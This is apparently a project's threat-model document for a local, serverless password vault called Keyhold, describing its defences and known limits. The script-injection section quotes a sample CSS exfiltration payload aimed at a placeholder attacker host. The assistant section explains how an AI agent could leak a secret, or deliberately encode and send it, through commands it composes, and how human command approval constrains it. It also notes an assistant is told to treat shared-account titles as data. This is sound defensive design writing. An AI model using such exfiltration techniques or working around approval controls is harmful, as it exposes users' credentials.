# Threat model

A vault that leaks once has lost its reason to exist, so it is worth being explicit about which
attacks Keyhold is built to survive, which it is not, and why.

The context that shapes all of it: **Keyhold has no server.** There is no account, no sync, no
operator. That removes an entire class of threat — nobody else's database can leak your vault —
and it moves the remaining ones onto your own machine.

## What Keyhold defends against

### T1 · Your disk is read

A backup lands in cloud storage. A synced folder is shared. A drive is sold, or stolen, or handed
to a repair shop. Another program on the machine walks your home directory.

**Defence.** The vault file is ciphertext under a key derived from your master password. There is
no key material stored beside it and no escrow copy. The file, the WAL sidecar and the directory
holding them are owner-only, re-checked on every open.

### T2 · The file is attacked offline

Somebody has the file and all the time in the world.

**Defence.** Argon2id with a 64 MiB memory cost, three iterations. This is the only thing that
matters in this scenario: an attacker with the file does not talk to Keyhold, so rate limiting and
attempt counters are theatre. The KDF parameters are recorded in the file and versioned so they can
be raised as hardware improves.

### T3 · A tampered or rolled-back vault

An attacker with write access to the file swaps a record for an older version of itself — restoring
a password you rotated after it leaked.

**Defence.** AES-GCM with additional authenticated data binding each payload to its record identity
and its version number. Decryption fails; it does not return an older plaintext.

**Limit, known and open.** This holds when only the payload is swapped. The version number itself is
a plain column, so somebody who rewrites the payload *and* its version in the same row does get the
older record to open. The same is true of the plain flags beside it (which vaults an agent may see,
the lock clocks, whether reads are logged): they can be edited in the file by anyone who can write
it. Closing this needs a manifest sealed under the vault key, and is on the roadmap. The trail's
hash chain has the same limit: it shows an accidental or clumsy edit, not one by somebody who
recomputes the chain.

### T4 · Script running on the interface page

The single most dangerous thing that can happen to a browser-based vault: the page that renders
your secrets also holds the session and the decrypted values. A malicious dependency, a stored
value rendered as markup, one `innerHTML`.

**Defence, in layers.** A CSP served with every response, built around the directive that matters:
`script-src 'self'` — no `unsafe-inline`, no `unsafe-eval`, no remote origin. Every line of
JavaScript the browser runs came out of the binary, and a test asserts that this directive is
exactly that string rather than merely containing it.

`style-src` does allow `unsafe-inline`, and that is a deliberate, measured trade. The interface's
components position popovers and dialogs by writing `style` on an element at runtime, which is how
every serious component library does it — a menu's position is not knowable at build time. Under
`style-src 'self'` the browser blocks those writes, and the result is not cosmetic: selects open in
the wrong place and scroll areas lose their scrollbars. What the concession costs is that an
attacker who could already inject markup could also inject CSS; what stops that being useful is the
rest of the policy. With `default-src 'none'`, `img-src 'self' data:`, `font-src 'self'` and
`connect-src 'self'`, injected CSS has nowhere to send anything — the classic
`background-image: url(https://attacker/…)` exfiltration has no reachable origin. Injected styles
can deface this page; they cannot phone home.

Beyond the policy: the whole bundle is compiled into the binary — there is no directory to drop a
file into, and nothing is fetched at runtime. No markdown or rich-text renderer anywhere. A test
fails the build on `innerHTML`, `eval`, `new Function`, or any remote URL in the interface source.

### T5 · Another local process

The Unix model does not separate processes running as the same user. Anything you run can connect to
Keyhold's port.

**Defence.** Every API route requires a session token that is generated per run, never written to
disk, delivered in the URL fragment, and compared in constant time. Authentication is a custom
header rather than a cookie, so a page in another tab cannot have the browser attach credentials on
its behalf. The agent surface (see the roadmap) uses a `0600` unix socket rather than a port, so
filesystem permission is the authentication and there is no token in a config file to steal.

### T6 · An unattended unlocked vault

You walk away. The laptop stays open.

**Defence.** Auto-lock on inactivity and on the window being hidden, both configurable, plus a lock
action always in reach. Locking wipes the key from memory rather than hiding the interface.

### T7 · The clipboard

Copying a password puts it somewhere Keyhold does not control.

**Defence.** Copies are cleared after a deadline, the countdown is visible, and a copy you make
yourself in the meantime cancels the clear rather than wiping your clipboard. The interface says
plainly that the operating system may keep a clipboard history no program can reach.

### T8 · Secrets escaping through logs, crashes and telemetry

The classic way a well-encrypted secret ends up in plaintext: an error report.

**Defence.** No telemetry of any kind. Key material is zeroized on drop, kept out of `Debug`
output, and never placed in argv or an inherited environment variable — `/proc/*/cmdline` and
`/proc/*/environ` are readable by any process of the same user. Release builds abort rather than
unwind on panic: an unwind mid-operation can drop key material in an order zeroization does not
cover.

### T9 · A secret an assistant repeats

An agent given a value can write it anywhere it writes: into a chat transcript, a summary, a commit
message, a file. This is not a failure of the agent — it is what having the value means.

**Defence.** Not instruction. The tool descriptions do ask, and nothing relies on it. What works is
never handing the value over:

- `keyhold_run` and `keyhold run` execute a command with the secret in the child process's
  environment. The agent composes the command and reads its output; the value is not in its
  context unless the command puts it there.
- `keyhold_copy` puts a value on the person's clipboard and returns only a confirmation, for the
  case where a human, not the model, is the one who needs it.
- A secret field (password, PIN, card, hidden) is **never returned as a value**, whatever is
  switched on. Reading the other fields is off by default.

**What this does and does not stop.** It stops the ordinary leak: a cooperative assistant that would
otherwise paste a password into a command or a summary. It does not stop an assistant that sets out
to read the value: the command is the assistant's, and a command can reverse, encode, store or send
what it is given. Blanking the value out of the output only catches a program that echoes it as it
is. The same holds for `keyhold_copy` when the assistant has a shell: the clipboard is readable by
anything running as this user. The control against that is the person, which is why:

- the approval dialog shows the **exact command**, and the trail records it;
- a lasting yes is for **one use and one program** of one record (a yes to `mysql` is not a yes to
  `sh`, a yes to reading a host name is not a yes to running anything), and the permission is
  sealed to its record so the file cannot be edited to point it elsewhere;
- a command runs for at most five minutes and one megabyte of output.

Approving `sh -c` or any interpreter, for any length of time, is approving whatever that
interpreter is told to do with the value.

The environment is used rather than the command line because a command line is visible to every
user of the machine (`ps`), and the environment only to processes of this user. The `{{secret}}`
placeholder exists for programs that take a secret only as an argument, and has that cost.

### What the file still shows

Somebody holding `vault.db` and nothing else can read:

- **How much there is** — how many vaults, folders and records, how the tree nests, and every
  created/updated date. Hiding shape as well would mean giving up SQL, and with it the tree.
- **What kind each record is** (`login`, `card`, `note`) and its flags — favourite, marked
  compromised, a rotation date. Metadata about a record, never its content.
- **The trail's skeleton** — that something happened at a time, what action it was, whether it was
  allowed, and the hash chain. Who did it, which record it was about and any detail are sealed.
- **How the key is derived** — the KDF parameters and the salts, which have to be readable to derive
  anything, and two wrapped copies of the vault key that open with the password or the recovery key.

What it does not show: a title, a username, an address, a note, a field label, a field value, a
vault or folder name, or which field of which record an agent was ever given.

### Where the session token lands

It lives in memory and in the URL fragment, and the fragment reaches two places outside this
process: the `xdg-open` helper's `/proc/<pid>/cmdline` while it runs, and — when Keyhold was started
from the desktop shortcut — `~/.local/state/keyhold/app.log`, because that log is where the URL can
be read when the browser did not open. The log is `0600` inside a `0700` directory and is rotated
once (`app.log.1`) on every start. The browser also keeps the address, fragment included, in its
history and session files, and shows it in its own command line when Keyhold opened it. Every token
dies with the process that made it, but while that process lives, **anything running as this user
that reads those places can act as the interface**, an assistant with a shell included. That is the
same-user limit stated under "What Keyhold does not defend against", and the reason a one-time
code in place of the token in the address is on the roadmap.

### A20 · The one thing that leaves the machine: an AWS vault's content, to its own account

"Nothing leaves the machine" has exactly one exception, and it is narrow on purpose. A vault created
as an AWS Parameter Store vault (F9) reads and writes its records in the AWS account it names, and
its attachments in the S3 bucket it names. Nothing else goes anywhere: not a local vault's content,
not another AWS vault's, not the names of local vaults, not the audit trail, not telemetry. A file
with no AWS vault in it never makes a single request.

What that exception rests on, and what it does not claim:

- **IAM decides who reads.** Values are SecureString under KMS, with no extra layer of Keyhold's
  own. Anyone the account's policies allow can read them with the console or the CLI, and a
  compromise of that account is a compromise of that vault. Keyhold adds nothing on AWS's side and
  says so.
- **Only the value is encrypted, and only the value holds secrets.** A record's title is written to
  the parameter's description, its folders are the parameter's path, and its marks are
  `keyhold:*` tags. None of that is encrypted: anyone allowed `ssm:DescribeParameters` or
  `ssm:ListTagsForResource` on the account reads titles, folder paths and marks, and CloudTrail
  records the description of every write. Notes are not metadata (people write PINs in them), so
  they live inside the encrypted value: a record with notes is always stored as Keyhold's JSON.
  Descriptions written before this rule (title, then notes) are still read, and the next save moves
  the notes into the value.
- **What the policy denies does not appear.** Content is listed only with `GetParametersByPath`,
  which respects a Deny. `DescribeParameters` is used only for the description and KMS key of
  parameters that were already returned.
- **The protection a secret has is never downgraded by a guess.** Overwriting a parameter, moving
  it, creating one in a folder (which inherits the folder's key) and attaching a file all need the
  KMS key the parameter or folder already uses. It is read by exact name from
  `DescribeParameters`, falling back to the newest `GetParameterHistory` entry; when neither can be
  read the write is refused with a sentence saying which permission is missing, never sent without
  a key (which would move the secret to `alias/aws/ssm`, or its attachment to `aws/s3`).
  `String` and `StringList` parameters are shown with `plaintext: true` and never overwritten:
  Keyhold writes only SecureString, and changing the type could break whatever reads them.
- **Writes say what happened, including half of it.** Parameter Store has no conditional write, so
  the version check (A12) is a read right before the put, with everything slow read earlier; a
  version that lands in between is reported as a `warning`, not hidden. A move (a put and a
  delete) answers `history_lost: true`, is refused while the record has attachments (they would be
  orphaned under the old name), and when the old name cannot be deleted it answers success with a
  warning that both copies exist. Deleting a record deletes its attachments first, and is refused if
  the bucket cannot be listed.
- **The bucket must be the account's own.** Every S3 request carries a signed
  `x-amz-expected-bucket-owner` with the connection's account id, so a bucket name taken over by
  another account after the original was deleted is answered with a 403, not with our files.
  Downloads are refused past the attachment limit from `Content-Length`, before the body is read.
- **Credentials are short and stay in memory.** Sign-in is IAM Identity Center's device flow.
  Tokens and role credentials are never written to disk and are dropped when the vault locks,
  including the auto-lock: a background sweep checks every few seconds, so nobody has to click for
  them to go. A login or refresh that completes after a lock is discarded, not stored for the next
  unlock. Removing a login logs it out of Identity Center first. The logins and connections that
  are remembered are sealed under the master key like everything else.
- **No local copy.** Values read from AWS are not written to the vault file. Two caches of a few
  seconds live in memory while the vault is open; stale entries are removed (not just skipped),
  editing, archiving or deleting a vault clears its entries, and everything is dropped on lock.
- **Signed requests go only to AWS's own endpoints** for the configured regions, over rustls with
  compiled-in roots, with redirects off (a signed request is never replayed to another host), with
  any system proxy ignored, and HTTPS only: the endpoint overrides the tests use do not exist in a
  release build.
- **The agent surface reaches an AWS vault only when it is switched on for agents**, with the same
  approval and trail as a local one. Titles and names in a shared account are written by whoever
  can write parameters there: an assistant is told to treat them as data, and a person should read
  them the same way.

## What Keyhold does not defend against

Stated plainly, because a vault that implies otherwise is lying:

- **Malware running as you.** A keylogger captures the master password as it is typed. A debugger
  attached to the process reads the key while the vault is open. Keyhold narrows the window; it
  does not outrank the kernel.
- **A compromised browser.** An extension with access to the page can read what the page renders.
  If you do not trust the browser, do not unlock the vault in it.
- **Screenshots, cameras, and memory.** A revealed secret is revealed.
- **Losing both the master password and the recovery key.** There is no recovery. This is not an
  oversight to be fixed later — an escrow copy would be a single target holding everything, and its
  absence is what makes the first promise true.

## Choices that were considered and rejected

| Alternative | Why not |
|---|---|
| Encrypting with a key stored beside the vault | Whoever reads the file reads the key. That is obfuscation, not confidentiality |
| Escrow or a reset code held anywhere | Recovers the forgetful user by creating a master key to everything: a rare risk traded for a catastrophic one |
| Validating the master password against a stored hash | Gives an offline attacker a cheap oracle. Decryption failure is the only check needed |
| A scored entropy meter | `log2(alphabet) × length` is exact for a generated password and a lie for a human one. Keyhold reports named, checkable findings instead |
| Serving the interface on a network interface | There is no version of this product that should. The bind address is not configurable |
